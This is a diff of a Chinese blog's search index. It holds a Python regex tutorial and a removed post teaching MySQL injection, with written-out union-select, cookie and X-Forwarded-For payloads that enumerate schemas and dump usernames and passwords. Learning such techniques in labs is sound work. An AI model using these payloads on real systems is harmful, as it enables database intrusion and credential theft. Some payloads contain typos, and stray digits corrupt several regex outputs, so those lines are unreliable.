-    <url>/2021/01/04/python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8Cre%E5%BA%93/</url>
-    <content><![CDATA[<p>正确使用正则表达式能省很多功夫</p>
-<a id="more"></a>
-<h2 id="1、正则表达式的语法"><a class="header-anchor" href="#1、正则表达式的语法">¶</a>1、正则表达式的语法</h2>
-<ul>
-<li>. 表示任何单个字符</li>
-<li>[] 字符集，对单个字符给出取值范围</li>
-<li>[^] 非字符集，对单个字符给出排除范围</li>
-<li>*前一个字符0次或者无限次扩展</li>
-<li>+前一个字符1次或无限次扩展</li>
-<li>?前一个字符0次或1次扩展</li>
-<li>|左右表达式任意一个</li>
-<li>{m}扩展前一个字符m次</li>
-<li>{m,n}扩展前一个字符m至n次</li>
-<li>^匹配字符串开头</li>
-<li>$匹配字符串结尾</li>
-<li>()分组标记，内部只能使用|操作符</li>
-<li>\d数字，等价于[0-9]</li>
-<li>\w单词字符，等价于[A-Z,a-z,0-9]</li>
-</ul>
-<h2 id="2、python中re库的使用"><a class="header-anchor" href="#2、python中re库的使用">¶</a>2、python中re库的使用</h2>
-<blockquote>
-<p>Re库是python的标准库，主要用于字符串匹配，调用方法：import re</p>
-</blockquote>
-<h3 id="2-1、正则表达式字符串的类型"><a class="header-anchor" href="#2-1、正则表达式字符串的类型">¶</a>2.1、正则表达式字符串的类型</h3>
-<p>re库采用raw string类型来表示正则表达式，表示为<br>
-<strong>r’text’</strong><br>
-raw string是不包含对转义符的再次转义的字符串，总而言就是string会对字符转义，而raw string不会，因为在正则表达中会出现转义符号，所以避免繁琐我们使用raw string</p>
-<h3 id="2-2、Re库主要功能函数"><a class="header-anchor" href="#2-2、Re库主要功能函数">¶</a>2.2、Re库主要功能函数</h3>
-<ul>
-<li><strong>re.search</strong>()在一个字符串中搜索正则表达式的第一个位置，返回match对象</li>
-<li>**re.match()**从一个字符串的开始位置起匹配正则表达式，返回match对象</li>
-<li>**re.findall()**搜索字符串，以列表类型返回全部能匹配的子串</li>
-<li>**re.split()**将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</li>
-<li>**re.finditer()**搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</li>
-<li>**re.sub()**在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</li>
-</ul>
-<h4 id="2-2-1、re-search-pattern-string-flags-0"><a class="header-anchor" href="#2-2-1、re-search-pattern-string-flags-0">¶</a>2.2.1、re.search(pattern, string, flags=0)</h4>
-<p>在一个字符串中搜索正则表达式的第一个位置，返回match对象</p>
-<ul>
-<li>pattern : 正则表达式的字符串或原生字符串表示</li>
-<li>string : 待匹配字符串</li>
-<li>flags : 正则表达式使用时的控制标记</li>
-<li>re.I re.IGNORECASE 忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
-<li>re.M re.MULTILINE 正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
-<li>re.S re.DOTALL 正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
-</ul>
-<p>举例说明：</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">结果为<span class="number">100081123456</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-2、re-match-pattern-string-flags-0"><a class="header-anchor" href="#2-2-2、re-match-pattern-string-flags-0">¶</a>2.2.2、re.match(pattern, string, flags=0)</h3>
-<p>从一个字符串的开始位置起匹配正则表达式，返回match对象<br>
-参数同search函数<br>
-举例说明：</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.match(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">结果会报错，match为空，因为match函数是</span><br><span class="line">从字符串开始位置开始匹配，因为从开始位置没有匹配到，所以为空<span class="number">123456</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-3、re-findall-pattern-string-flags-0"><a class="header-anchor" href="#2-2-3、re-findall-pattern-string-flags-0">¶</a>2.2.3、re.findall(pattern, string, flags=0)</h3>
-<p>搜索字符串，以列表类型返回全部能匹配的子串<br>
-参数同search<br>
-举例说明:</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ls=re.findall(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">print(ls)</span><br><span class="line"></span><br><span class="line">结果为[<span class="string">&#x27;100081&#x27;</span>, <span class="string">&#x27;100084&#x27;</span>]<span class="number">12345</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-4、re-split-pattern-string-maxsplit-0-flags-0"><a class="header-anchor" href="#2-2-4、re-split-pattern-string-maxsplit-0-flags-0">¶</a>2.2.4、re.split(pattern, string, maxsplit=0, flags=0)</h3>
-<p>将一个字符串按照正则表达式匹配结果进行分割返回列表类型</p>
-<ul>
-<li>maxsplit : 最大分割数，剩余部分作为最后一个元素输出<br>
-举例说明 ：</li>
-</ul>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">结果[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU&#x27;</span>, <span class="string">&#x27; &#x27;</span>]</span><br><span class="line">re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">结果[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU100081&#x27;</span>]<span class="number">12345</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-5、re-finditer-pattern-string-maxsplit-0-flags-0"><a class="header-anchor" href="#2-2-5、re-finditer-pattern-string-maxsplit-0-flags-0">¶</a>2.2.5、re.finditer(pattern, string, maxsplit=0, flags=0)</h3>
-<p>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象<br>
-参数同search<br>
-举例说明 :</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        print(m.group(<span class="number">0</span>))</span><br><span class="line">结果为</span><br><span class="line"><span class="number">100081</span></span><br><span class="line"><span class="number">1000841234567</span></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-6、re-sub-pattern-repl-string-count-0-flags-0"><a class="header-anchor" href="#2-2-6、re-sub-pattern-repl-string-count-0-flags-0">¶</a>2.2.6、re.sub(pattern, repl, string, count=0, flags=0)</h3>
-<p>在一个字符串中替换所有匹配正则表达式的子串返回替换后的字符串</p>
-<ul>
-<li>repl : 替换匹配字符串的字符串</li>
-<li>count : 匹配的最大替换次数<br>
-举例说明:</li>
-</ul>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.sub(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;:zipcode&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">结果为</span><br><span class="line"><span class="string">&#x27;BIT:zipcode TSU:zipcode&#x27;</span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
-<h2 id="2-3Re库的另一种等价用法（面向对象）"><a class="header-anchor" href="#2-3Re库的另一种等价用法（面向对象）">¶</a>2.3Re库的另一种等价用法（面向对象）</h2>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rst=re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">函数式的调用，一次性操作<span class="number">12</span></span><br><span class="line">pat=re.<span class="built_in">compile</span>(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>)</span><br><span class="line">rst=pat.search(<span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">编译后多次操作<span class="number">123</span></span><br></pre></td></tr></table></figure>
-<p>regex=re.complie(pattern,flags=0)<br>
-regex也有以上六种用法</p>
-<h2 id="2-4Re库的Match对象"><a class="header-anchor" href="#2-4Re库的Match对象">¶</a>2.4Re库的Match对象</h2>
-<blockquote>
-<p>Match对象是是一次匹配的结果，包含匹配的很多信息</p>
-</blockquote>
-<p>*<strong>以下是Match对象的属性*</strong></p>
-<ul>
-<li>.string 待匹配的文本</li>
-<li>.re 匹配时使用的patter对象（正则表达式）</li>
-<li>.pos 正则表达式搜索文本的开始位置</li>
-<li>.endpos 正则表达式搜索文本的结束位置</li>
-</ul>
-<p>*<strong>以下是Match对象的方法*</strong></p>
-<ul>
-<li>.group(0) 获得匹配后的字符串</li>
-<li>.start() 匹配字符串在原始字符串的开始位置</li>
-<li>.end() 匹配字符串在原始字符串的结束位置</li>
-<li>.span() 返回(.start(), .end())</li>
-</ul>
-<h2 id="2-5Re库的贪婪匹配和最小匹配"><a class="header-anchor" href="#2-5Re库的贪婪匹配和最小匹配">¶</a>2.5Re库的贪婪匹配和最小匹配</h2>
-<p>当正则表达式可以匹配长短不同的多项时，返回哪一个呢？Re库默认采用贪婪匹配，即返回匹配最长的子串</p>
-<p>*<strong>最小匹配*</strong></p>
-<ul>
-<li>*? 前一个字符0次或无限次扩展，最小匹配</li>
-<li>+? 前一个字符1次或无限次扩展，最小匹配</li>
-<li>?? 前一个字符0次或1次扩展，最小匹配</li>
-<li>{m,n}? 扩展前一个字符m至n次（含n），最小匹配</li>
-</ul>
-<p><strong>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</strong></p>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql注入之mysql学习基础(二)</title>
-    <url>/2021/01/05/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bmysql%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80(%E4%BA%8C)/</url>
-    <content><![CDATA[<p>介绍几种常见的mysql注入类型</p>
-<a id="more"></a>
-<h1>MySQL注入</h1>
-<h2 id="基本介绍"><a class="header-anchor" href="#基本介绍">¶</a>基本介绍</h2>
-<h3 id="字符型"><a class="header-anchor" href="#字符型">¶</a>字符型</h3>
-<p>有这几种常见情况,闭合SQL语句，再插入我们需要的sql语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id= &#x27;$id&#x27;&quot;;</span><br><span class="line">闭合前面的单引号把后面的单引号注释掉跟上<span class="keyword">sql</span>语句</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27; ))</span><br><span class="line">闭合单引号，闭合两个括号把后面的都注释掉跟上sql语句</span><br><span class="line">$sql=&quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>)&quot;;</span><br><span class="line">闭合单引号，闭合括号把后面的都注释掉跟上sql语句</span><br><span class="line">$id =&#x27;&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;&#x27;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">闭合前面的双引号再注释后面的双引号</span><br><span class="line">$id = &#x27;(&quot;<span class="string">&#x27;.$id.&#x27;</span>&quot;)&#x27;;</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> $id&quot;;</span><br><span class="line">1234567891011</span><br></pre></td></tr></table></figure>
-<h3 id="数字型"><a class="header-anchor" href="#数字型">¶</a>数字型</h3>
-<p>字符型和数字型的区别在于接受的参数id的类型和数据库中id的字段类型<br>
-其实和字符型的注入方式是一样的，不必过度纠结于两者具体的区别</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id&quot;;</span><br></pre></td></tr></table></figure>
-<h3 id="搜索型"><a class="header-anchor" href="#搜索型">¶</a>搜索型</h3>
-<p>就是post型的提交方式<br>
-<a href="https://imgchr.com/i/sAayjJ"><img src="https://s3.ax1x.com/2021/01/05/sAayjJ.png" alt="sAayjJ.png"></a></p>
-<h3 id="Cookie注入"><a class="header-anchor" href="#Cookie注入">¶</a>Cookie注入</h3>
-<p><a href="https://imgchr.com/i/sAabDA"><img src="https://s3.ax1x.com/2021/01/05/sAabDA.png" alt="sAabDA.png"></a></p>
-<h3 id="HTTP头注入"><a class="header-anchor" href="#HTTP头注入">¶</a>HTTP头注入</h3>
-<p>X-Forwarded-For<br>
-X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。类似的还有如下几种<br>
-X-Originating-IP: 127.0.0.1<br>
-X-Forwarded-For: 127.0.0.1<br>
-X-Remote-IP: 127.0.0.1<br>
-X-Remote-Addr: 127.0.0.1<br>
-Client-IP: 127.0.0.1<br>
-User-agent<br>
-用户代理(user agent)是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息(如:购物车)。在这种情况下，我们就有必要研究下user-agent头存在的问题了。<br>
-Referer<br>
-Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。<br>
-<a href="https://imgchr.com/i/sAaj4f"><img src="https://s3.ax1x.com/2021/01/05/sAaj4f.png" alt="sAaj4f.png"></a></p>
-<h2 id="具体实例"><a class="header-anchor" href="#具体实例">¶</a>具体实例</h2>
-<h3 id="数字型注入"><a class="header-anchor" href="#数字型注入">¶</a>数字型注入</h3>
-<h4 id="一般类型"><a class="header-anchor" href="#一般类型">¶</a>一般类型</h4>
-<p>因为不知道接收的id是1或者是&quot;1&quot;的形式我们先当成数字型注入<br>
-如何判断：'url?id=1+1’如果成功返回数据则为数字型注入<code>+</code>=<code>%2b</code><br>
-<a href="https://imgchr.com/i/sAdibn"><img src="https://s3.ax1x.com/2021/01/05/sAdibn.png" alt="sAdibn.png"></a><br>
-首先查字段<br>
-url?id = 1 order by 3 不报错<br>
-url?id = 1 order by 4 报错<br>
-所以有三个字段<br>
-接下来使用联合查询:<code>url?id = 1 union select 1,2,3</code><br>
-<a href="https://imgchr.com/i/sAdE5V"><img src="https://s3.ax1x.com/2021/01/05/sAdE5V.png" alt="sAdE5V.png"></a><br>
-查当前数据库名，版本，用户<br>
-<code>url?id = 1 union select database(),version(),user()</code><br>
-<a href="https://imgchr.com/i/sAdZCT"><img src="https://s3.ax1x.com/2021/01/05/sAdZCT.png" alt="sAdZCT.png"></a><br>
-查询有什么表<br>
-<code>url?id = 1 union select 1,2,table_name from infomation_schema.tables where table_schema = database()</code><br>
-<a href="https://imgchr.com/i/sAdm2F"><img src="https://s3.ax1x.com/2021/01/05/sAdm2F.png" alt="sAdm2F.png"></a><br>
-查询列名：<br>
-<code>url?id = 1 union select 1,2,column_name from infomation_schema.columns where table_table = 'users'</code><br>
-<a href="https://imgchr.com/i/sAd1V1"><img src="https://s3.ax1x.com/2021/01/05/sAd1V1.png" alt="sAd1V1.png"></a><br>
-查询数据：<br>
-<code>url?id = 1 union select id,username,password from users</code><br>
-<a href="https://imgchr.com/i/sAdt2D"><img src="https://s3.ax1x.com/2021/01/05/sAdt2D.png" alt="sAdt2D.png"></a></p>
-<h4 id="被单引号包裹起来的"><a class="header-anchor" href="#被单引号包裹起来的">¶</a>被单引号包裹起来的</h4>
-<p><a href="https://imgchr.com/i/sAdgxg"><img src="https://s3.ax1x.com/2021/01/05/sAdgxg.png" alt="sAdgxg.png"></a><br>
-<a href="https://imgchr.com/i/sAd5aq"><img src="https://s3.ax1x.com/2021/01/05/sAd5aq.png" alt="sAd5aq.png"></a><br>
-在之后我们拼接and 1=1 and 1= 2,发现没有报错<br>
-<a href="https://imgchr.com/i/sAdTiV"><img src="https://s3.ax1x.com/2021/01/05/sAdTiV.png" alt="sAdTiV.png"></a><br>
-之后加上<code>id = 1'</code>单引号后报错，不正常说明sql语句可控<br>
-在Mysql中<code>--+</code>代表注释此时<code>id = 1'--+</code>成功执行<br>
-<a href="https://imgchr.com/i/sAdXL9"><img src="https://s3.ax1x.com/2021/01/05/sAdXL9.png" alt="sAdXL9.png"></a><br>
-之后插上<code>id = 1 and 1=2'-- +</code>不正常，即可食用之后类似上面一般类型</p>
-<h4 id="双引号加小括号包裹"><a class="header-anchor" href="#双引号加小括号包裹">¶</a>双引号加小括号包裹</h4>
-<p><a href="https://imgchr.com/i/sAdzIx"><img src="https://s3.ax1x.com/2021/01/05/sAdzIx.png" alt="sAdzIx.png"></a><br>
-首先查看<code>id = 1</code><br>
-<a href="https://imgchr.com/i/sAwPzD"><img src="https://s3.ax1x.com/2021/01/05/sAwPzD.png" alt="sAwPzD.png"></a><br>
-类似上面<code>?id = 1') and 1 = 2-- +</code>发现1=1和1=2成功执行</p>
-<h4 id="两个括号"><a class="header-anchor" href="#两个括号">¶</a>两个括号</h4>
-<p><img src="https://img-blog.csdnimg.cn/20200618112825139.png" alt="在这里插入图片描述"><br>
-<a href="https://imgchr.com/i/sAwksH"><img src="https://s3.ax1x.com/2021/01/05/sAwksH.png" alt="sAwksH.png"></a><br>
-采用<code>? id = 1')) union select 1,2,3 -- +</code></p>
-<h3 id="字符型注入"><a class="header-anchor" href="#字符型注入">¶</a>字符型注入</h3>
-<p>如果在url后拼接<code>?id=1 and 1=1</code>or<code>and 1=2</code>分别正确错误则说明为字符型注入<br>
-注入方式和数字型类似</p>
-<h3 id="搜索型注入"><a class="header-anchor" href="#搜索型注入">¶</a>搜索型注入</h3>
-<p><a href="https://imgchr.com/i/sAwALd"><img src="https://s3.ax1x.com/2021/01/05/sAwALd.png" alt="sAwALd.png"></a><br>
-%代表%前面可以有字符后面也可以有<br>
-配合HackBar食用<br>
-<a href="https://imgchr.com/i/sAwZdI"><img src="https://s3.ax1x.com/2021/01/05/sAwZdI.png" alt="sAwZdI.png"></a><br>
-post数据<code>name = a' union select 1,2,3 -- +</code></p>
-<h3 id="Cookie注入-v2"><a class="header-anchor" href="#Cookie注入-v2">¶</a>Cookie注入</h3>
-<p><a href="https://imgchr.com/i/sAwnFP"><img src="https://s3.ax1x.com/2021/01/05/sAwnFP.png" alt="sAwnFP.png"></a><br>
-配合Burp使用<br>
-<a href="https://imgchr.com/i/sAw1yQ"><img src="https://s3.ax1x.com/2021/01/05/sAw1yQ.png" alt="sAw1yQ.png"></a><br>
-改为<code>Cookie: uid = 1 union select 1,2,3</code></p>
-<h3 id="HTTP头注入-v2"><a class="header-anchor" href="#HTTP头注入-v2">¶</a>HTTP头注入</h3>
-<p><a href="https://imgchr.com/i/sAwYoq"><img src="https://s3.ax1x.com/2021/01/05/sAwYoq.png" alt="sAwYoq.png"></a><br>
-<a href="https://imgchr.com/i/sAwfSO"><img src="https://s3.ax1x.com/2021/01/05/sAwfSO.png" alt="sAwfSO.png"></a></p>
-<p>配合Burp食用<br>
-<a href="https://imgchr.com/i/sAwbkt"><img src="https://s3.ax1x.com/2021/01/05/sAwbkt.png" alt="sAwbkt.png"></a><br>
-添加XFF头<br>
-<a href="https://imgchr.com/i/sA0FhV"><img src="https://s3.ax1x.com/2021/01/05/sA0FhV.png" alt="sA0FhV.png"></a><br>
-完美成功!!!<br>
-<code>127.0.0.1' order by 4-- +</code>成功，配合联合查询即可！！！<br>
-<a href="https://imgchr.com/i/sA0VcF"><img src="https://s3.ax1x.com/2021/01/05/sA0VcF.png" alt="sA0VcF.png"></a><br>
-看图<br>
-<a href="https://imgchr.com/i/sA0u7R"><img src="https://s3.ax1x.com/2021/01/05/sA0u7R.png" alt="sA0u7R.png"></a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
       </categories>
   </entry>
   <entry>
@@ -1986,6 +1578,268 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
       </categories>
   </entry>
   <entry>
+    <title>python正则表达式和re库</title>
+    <url>/2021/01/04/python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8Cre%E5%BA%93/</url>
+    <content><![CDATA[<p>正确使用正则表达式能省很多功夫</p>
+<a id="more"></a>
+<h2 id="1、正则表达式的语法"><a class="header-anchor" href="#1、正则表达式的语法">¶</a>1、正则表达式的语法</h2>
+<ul>
+<li>. 表示任何单个字符</li>
+<li>[] 字符集，对单个字符给出取值范围</li>
+<li>[^] 非字符集，对单个字符给出排除范围</li>
+<li>*前一个字符0次或者无限次扩展</li>
+<li>+前一个字符1次或无限次扩展</li>
+<li>?前一个字符0次或1次扩展</li>
+<li>|左右表达式任意一个</li>
+<li>{m}扩展前一个字符m次</li>
+<li>{m,n}扩展前一个字符m至n次</li>
+<li>^匹配字符串开头</li>
+<li>$匹配字符串结尾</li>
+<li>()分组标记，内部只能使用|操作符</li>
+<li>\d数字，等价于[0-9]</li>
+<li>\w单词字符，等价于[A-Z,a-z,0-9]</li>
+</ul>
+<h2 id="2、python中re库的使用"><a class="header-anchor" href="#2、python中re库的使用">¶</a>2、python中re库的使用</h2>
+<blockquote>
+<p>Re库是python的标准库，主要用于字符串匹配，调用方法：import re</p>
+</blockquote>
+<h3 id="2-1、正则表达式字符串的类型"><a class="header-anchor" href="#2-1、正则表达式字符串的类型">¶</a>2.1、正则表达式字符串的类型</h3>
+<p>re库采用raw string类型来表示正则表达式，表示为<br>
+<strong>r’text’</strong><br>
+raw string是不包含对转义符的再次转义的字符串，总而言就是string会对字符转义，而raw string不会，因为在正则表达中会出现转义符号，所以避免繁琐我们使用raw string</p>
+<h3 id="2-2、Re库主要功能函数"><a class="header-anchor" href="#2-2、Re库主要功能函数">¶</a>2.2、Re库主要功能函数</h3>
+<ul>
+<li><strong>re.search</strong>()在一个字符串中搜索正则表达式的第一个位置，返回match对象</li>
+<li>**re.match()**从一个字符串的开始位置起匹配正则表达式，返回match对象</li>
+<li>**re.findall()**搜索字符串，以列表类型返回全部能匹配的子串</li>
+<li>**re.split()**将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</li>
+<li>**re.finditer()**搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</li>
+<li>**re.sub()**在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</li>
+</ul>
+<h4 id="2-2-1、re-search-pattern-string-flags-0"><a class="header-anchor" href="#2-2-1、re-search-pattern-string-flags-0">¶</a>2.2.1、re.search(pattern, string, flags=0)</h4>
+<p>在一个字符串中搜索正则表达式的第一个位置，返回match对象</p>
+<ul>
+<li>pattern : 正则表达式的字符串或原生字符串表示</li>
+<li>string : 待匹配字符串</li>
+<li>flags : 正则表达式使用时的控制标记</li>
+<li>re.I re.IGNORECASE 忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
+<li>re.M re.MULTILINE 正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
+<li>re.S re.DOTALL 正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
+</ul>
+<p>举例说明：</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">结果为<span class="number">100081123456</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-2、re-match-pattern-string-flags-0"><a class="header-anchor" href="#2-2-2、re-match-pattern-string-flags-0">¶</a>2.2.2、re.match(pattern, string, flags=0)</h3>
+<p>从一个字符串的开始位置起匹配正则表达式，返回match对象<br>
+参数同search函数<br>
+举例说明：</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.match(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">结果会报错，match为空，因为match函数是</span><br><span class="line">从字符串开始位置开始匹配，因为从开始位置没有匹配到，所以为空<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-3、re-findall-pattern-string-flags-0"><a class="header-anchor" href="#2-2-3、re-findall-pattern-string-flags-0">¶</a>2.2.3、re.findall(pattern, string, flags=0)</h3>
+<p>搜索字符串，以列表类型返回全部能匹配的子串<br>
+参数同search<br>
+举例说明:</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ls=re.findall(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">print(ls)</span><br><span class="line"></span><br><span class="line">结果为[<span class="string">&#x27;100081&#x27;</span>, <span class="string">&#x27;100084&#x27;</span>]<span class="number">12345</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-4、re-split-pattern-string-maxsplit-0-flags-0"><a class="header-anchor" href="#2-2-4、re-split-pattern-string-maxsplit-0-flags-0">¶</a>2.2.4、re.split(pattern, string, maxsplit=0, flags=0)</h3>
+<p>将一个字符串按照正则表达式匹配结果进行分割返回列表类型</p>
+<ul>
+<li>maxsplit : 最大分割数，剩余部分作为最后一个元素输出<br>
+举例说明 ：</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">结果[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU&#x27;</span>, <span class="string">&#x27; &#x27;</span>]</span><br><span class="line">re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">结果[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU100081&#x27;</span>]<span class="number">12345</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-5、re-finditer-pattern-string-maxsplit-0-flags-0"><a class="header-anchor" href="#2-2-5、re-finditer-pattern-string-maxsplit-0-flags-0">¶</a>2.2.5、re.finditer(pattern, string, maxsplit=0, flags=0)</h3>
+<p>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象<br>
+参数同search<br>
+举例说明 :</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        print(m.group(<span class="number">0</span>))</span><br><span class="line">结果为</span><br><span class="line"><span class="number">100081</span></span><br><span class="line"><span class="number">1000841234567</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-6、re-sub-pattern-repl-string-count-0-flags-0"><a class="header-anchor" href="#2-2-6、re-sub-pattern-repl-string-count-0-flags-0">¶</a>2.2.6、re.sub(pattern, repl, string, count=0, flags=0)</h3>
+<p>在一个字符串中替换所有匹配正则表达式的子串返回替换后的字符串</p>
+<ul>
+<li>repl : 替换匹配字符串的字符串</li>
+<li>count : 匹配的最大替换次数<br>
+举例说明:</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.sub(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;:zipcode&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">结果为</span><br><span class="line"><span class="string">&#x27;BIT:zipcode TSU:zipcode&#x27;</span><span class="number">1234</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-3Re库的另一种等价用法（面向对象）"><a class="header-anchor" href="#2-3Re库的另一种等价用法（面向对象）">¶</a>2.3Re库的另一种等价用法（面向对象）</h2>
